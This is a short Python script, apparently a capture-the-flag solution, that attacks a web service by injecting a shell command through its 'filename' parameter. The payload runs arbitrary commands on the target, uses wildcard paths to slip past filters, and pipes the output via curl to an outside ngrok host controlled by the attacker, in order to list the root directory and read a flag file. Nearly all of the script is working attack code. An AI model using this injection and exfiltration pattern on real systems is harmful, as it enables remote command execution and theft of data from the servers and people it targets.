#!/usr/bin/python3
import requests

URL = 'http://140.118.126.237:8898/'

# Using ngrok to build a host
MyHost = 'http://30a8afbe.ngrok.io'

def backdoor(cmd):
    cmdwrap = "echo $(" + cmd + ") | tr -d '[:space:]'"
    payload = "a|echo '" + MyHost + "/?'$("+cmdwrap+") | xargs curl"
    params = {'filename': payload}
    r = requests.get(url = URL, params = params)

    print('request: {}'.format(r.request.url))
    print('response: {}'.format(r.text.find('owo?', 2095)))


# Leak directories, find file /fl4ggg
# backdoor("ls -l /")

# cat /fl4ggg
backdoor("/bin/ca* /fl4*")

